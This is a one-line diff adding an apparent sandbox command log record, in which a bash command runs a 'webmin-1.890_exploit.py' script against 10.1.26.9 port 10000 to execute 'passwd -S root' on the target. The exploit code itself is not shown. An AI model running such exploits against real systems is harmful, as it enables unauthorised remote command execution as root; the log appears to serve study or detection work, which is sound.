@@ -1,0 +1,1 @@
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T06:58:55.079Z", "cmd_type": "bash-command", "cmd": "python3 webmin-1.890_exploit.py 10.1.26.9 10000 'passwd -S root'"}
